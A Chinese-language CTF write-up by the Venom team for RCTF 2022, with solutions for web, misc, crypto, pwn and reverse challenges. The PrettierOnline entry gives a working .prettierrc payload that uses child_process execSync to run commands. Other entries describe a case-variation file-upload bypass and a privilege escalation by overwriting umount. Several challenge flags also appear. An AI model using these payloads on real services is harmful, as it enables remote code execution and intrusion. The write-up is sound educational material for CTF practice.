---
title: 2022RCTF WriteUp by Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247507919&idx=1&sn=5943f10b726185be3e6179e0edb61cf8&chksm=e89df717dfea7e014fa3ea7e6cac6e484460280ab9b175d564995042e16bfc209cd8b5e82851&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2022-12-14
fetch_date: 2025-10-04T01:24:28.292077
---

# 2022RCTF WriteUp by Venom

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2L8gRKujJ9x26iafak7VwGIh4TGkBASicTnS7CR7YnH0KTgruazaG6qyA/0?wx_fmt=jpeg)

# 2022RCTF WriteUp by Venom

原创

Venom

ChaMd5安全团队

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2TNB7crjYiamo4EvYWby7iadicuS49ANKzzVjkf62GciamIHfsOqFdu2P6w/640?wx_fmt=png)

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

## Web

### filechecker\_mini

解题思路

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2SckSVZAw14og6Q3n8JHicicxpZyny1DicdjupkQnBA4fC7KUx6aMVn3kw/640?wx_fmt=png)

RCTF{Just\_A\_5mall\_Tr1ck\_mini1i1i1\_\_Fl4g\_Y0u\_gOtt777!!!}

### easy\_upload

解题思路
属于是上车了，骑马上去看到的别人的姿势，后缀比较简单, pHp大小写即可绕过

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2Xnkg55ibaLnhnUrbWhesuSQH7RJxbBz9qmtWKhPU4z1ptkdqsbwEguQ/640?wx_fmt=png)

### PrettierOnline

解题思路
Configuration File · Prettier https://prettier.io/docs/en/configuration.html

* A "prettier" key in your package.json file.
* A .prettierrc file written in JSON or YAML.
* A .prettierrc.json, .prettierrc.yml, .prettierrc.yaml, or .prettierrc.json5 file.
* A .prettierrc.js, .prettierrc.cjs, prettier.config.js, or prettier.config.cjs file that exports an object using module.exports.
* A .prettierrc.toml file.

use .prettierrc as YAML and insert js code

```
trailingComma: "es5"
tabWidth: 4
semi: false
singleQuote: true
parser: ".prettierrc"
d: var load = global.process.mainModule.constructor._load
a: function exec(cmd){return load('child_process').execSync(cmd).toString()}
b: var flag = exec("/readflag")
p1: function babel(text, parsers, opts = {}) {return text+flag};
p2: module.exports=babel
```

load custom parser to run evil code

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2JBqdxzfcNoCGhbKS9ONFdT7N2phR58RowsNFO93icVbJxI2SU844UeA/640?wx_fmt=png)

RCTF{pReTtiErRc.yAmL.iS.fUnnY}

### filechecker\_plus

解题思路
应该是别人打通了 上车了 直接看到flag了

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2U1FNVMJ9ybK9jPe3P7xBf35VoiaugM5H2dx2917t5GzYWDGGb5lm7WQ/640?wx_fmt=png)

## Misc

### Checkin

解题思路

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2jCA41LEuPfHq4M83tpBRuTD7Zg6Iyoa6JnuibaTk5lh4U4FM1wdpM0A/640?wx_fmt=png)

### ez\_alient

解题思路
在alien.bmp的结尾发现base64，解码得到压缩包密码
pwd="N0bOdy\_l0ves\_Me"
查看解压出来的文件特征可知这是一个Windows可执行文件，修改后缀为exe

解包并反编译pyc可以在alien\_invasion类中看见部分flag

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2FzgEuOqiatJIfcuDtdDFaCok49hr7DTt4pgE9VMJX8ia4iciaXicjicxHOeg/640?wx_fmt=png)

并且在其他部分的源码中发现了另外部分的flag

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2joNNc7knG24jx5wPScfhGgIvvcCoV0iajqgzKLYynD7eriaqHSvqb39w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2LwXjn6TCakRd7V6MJQ7EwzoSiawCoQ1oCQy2ENGdhjDmlxH6UtCIKoQ/640?wx_fmt=png)

调整位置可以得到flag
RCTF{Si13nc3\_15\_nEvEr\_9ivin9\_up\_&&\_6ut\_h01din9\_On\_Si13nT1y}

### K999

解题思路

```
function to8(n)
    return n % 256
end

function bxor(a, b)
    local p = 0
    local i = 0
    for i = 0, 7, 1 do
        p = p + 2 ^ i * ((a % 2 + b % 2) % 2)
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        if a == 0 and b == 0 then break end
    end
    return p
end

function encrypt(v, k)
    local sum = 0
    local delta = 0x37
    local i = 0
    for i = 1, 8, 1 do
        sum = to8(sum + delta)
        v[1] = to8(v[1] + to8(bxor(bxor(to8((v[2] * 16) + k[1]), to8(v[2] + sum)), to8(math.floor(v[2] / 32) + k[2]))))
        v[2] = to8(v[2] + to8(bxor(bxor(to8((v[1] * 16) + k[3]), to8(v[1] + sum)), to8(math.floor(v[1] / 32) + k[4]))))
    end
end

function decrypt(v, k)
    local sum = 0xB8
    local delta = 0x37
    local i = 0
    for i = 1, 8, 1 do
        v[2] = to8(v[2] - to8(bxor(bxor(to8((v[1] * 16) + k[3]), to8(v[1] + sum)), to8(math.floor(v[1] / 32) + k[4]))))
        v[1] = to8(v[1] - to8(bxor(bxor(to8((v[2] * 16) + k[1]), to8(v[2] + sum)), to8(math.floor(v[2] / 32) + k[2]))))
        sum = sum - delta
    end
end

function passGen()
    local pw = ""
    local j
    for i = 1, 4, 1 do
        j = math.random(33, 126)
        if j == 96 then pw = pw .. "_"
        else pw = pw .. string.char(j) end
    end
    return pw
end

function strDecrypt(s, k)
    local b = {}
    local c = {}
    local i
    local j
    j = string.gmatch(k, ".")
    b = { string.byte(j()), string.byte(j()), string.byte(j()), string.byte(j()) }
    j = ""
    for i = 1, string.len(s) / 2, 1 do
        c = { string.byte(string.sub(s, i * 2 - 1, i * 2 - 1)), string.byte(string.sub(s, i * 2, i * 2)) }
        decrypt(c, b)
        j = j .. string.char(c[1])
        if c[2] == 0 then break end
        j = j .. string.char(c[2])
    end
    return j
end

function Decrypt()
    local key = "MOON"
    local s = {157,89,215,46,13,189,237,23,241,49,84,146,248,150,138,183,119,52,34,174,146,132,225,192,5,220,221,176,184,218,19,87,249,122}
    flag = ""
    for i = 1, #s, 1 do
        flag = flag .. string.char(s[i])
    end
    flag = strDecrypt(flag, key)
    print(flag)
end

Decrypt()
```

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2a4JnXNHLPvzaJicgI9FPdZzvQWJHU4leU4GPg70Zx2wjAXUrrUGWsqg/640?wx_fmt=png)

### ezPVZ

解题思路

一个Win32的植物大战僵尸，gamelevel、gamelevel2、gamelevel3里存储了当前阳光，植物是否点亮、植物需要的阳光等状态，class vftable里面有购买植物时触发的时间，用IDA pro或者x64dbg下断点来修改游戏信息即可。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2eIBQjk4ib8ibAavAgdjQfkEEDPRBxibPadbRcAoybMDvJOMdRwd4MpmUA/640?wx_fmt=png)

## Crypto

### guess

解题思路

非预期了，因为chaos加起来太小了，整除可以消除影响

```
from pwn import *
from Crypto.Util.number import *
a=remote("190.92.234.114",23334)
l=a.recvline().split(b'=')[1]
b=a.recvline().split(b'=')[1]
d=b[2:-2].split(b',')
c=a.recvline().split(b'=')[1]
e=c[2:-2].split(b',')
T=[]
U=[]
for i in range(len(d)):
    T.append(int(d[i]))
    U.append(int(e[i]))
x = 0
y=0
for i in range(len(T)):
   x += U[i]
   y+=T[i]
x = x // y
x=long_to_bytes(x)
#print(x)
m=sorted('rctf_')
s=''
for i in range(len(m)):
    s+=m[i]
x = x[:15]+s.encode()
x= bytes_to_long(x)
a.sendlineafter(b"x = ",str(x).encode())
a.interactive()
```

## Pwn

### game

解题思路
/bin目录的owner是ctf用户

将umount的内容换成cat /flag，执行exit后就会以root身份执行cat /flag

## Reverse

### CheckYourKey

解题思路
检测逻辑位于so文件中，字符串有加密，通过交叉引用找到解密解密代码。位于init\_array 输入之后进行base58，最后进行变表base64和eRRqdUxQWENUbWVmbTZtZlg4bmFxQg比较 但是解出来不对，怀疑JNI\_OnLoad肯定有问题，于是找到动态注册 动态注册的函数只有比对数据不同，并且多了一个函数的转换，后两步相同 所以先完成后两步逆向

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2AVv7LaW1xzMNBatBb95DEfTp5ml3OQpdz7NuWbuKLLPstRgMBQk2uQ/640?wx_fmt=png)

然后发现那个转换就是AES，直接解

```
import base64
from Crypto.Cipher import AES

r=b'SVTsfWzSYGPWdYXodVbvbni6doHzSi=='
b64_tab=b'+/EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCD'
b58_tab=b'rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz'
r=b'\x49\x67\xeb\x32\x9d\x05\x61\xda\xdb\x07\xd7\x5a\xb9\x01\xb2\x46'
b_0x41140=b'goodlucksmartman'

aes=AES.new(b_0x41140,AES.MODE_ECB)
aes.decrypt(r)
  flag{rtyhgf!@#$}
```

### Huowang

解题思路
这是一个迷宫题，迷宫存在多个可解路径，其中一条路径为正确输入（取决于第二个指标），一共有两个指标判断是否为正确flag。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2PXlfTGIiaGGVRm60FqhcFUu4TrhjPDXjYFTaSGNekeoSse9Yt2ZuUkQ/640?wx_fmt=png)第一个指标是判断该路径是否可以到达出口。由于迷宫路径解有限，所以第二个指标的相关代码懒得看了，直接爆破路径，最后爆出286条路径可达。经验证，正确输入为“sssddwwddssssddddssaassddssaassddddwwwwwwwwddddwwddwwddddssssaassaassaassddddssaassaaaaaassassdddwwddddddssaaaassdddddds”。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2pFFLI5z0h1rB7YQNbBsSZzmEcUibEIQW7GXbDLIW4QQE5U4iaBEpDfnw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQCZwI04xibcDBuicf9o9prd2kl5dmw60ibHt3ic5StWhMFL9w5gI3IJEVKdVS1z9wZKwFuK77rd3MYfg/640?wx_fmt=png)

RCTF{e1f9e3d166dcec5ecff3a2c5fbdeab3b}

- END -

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrz...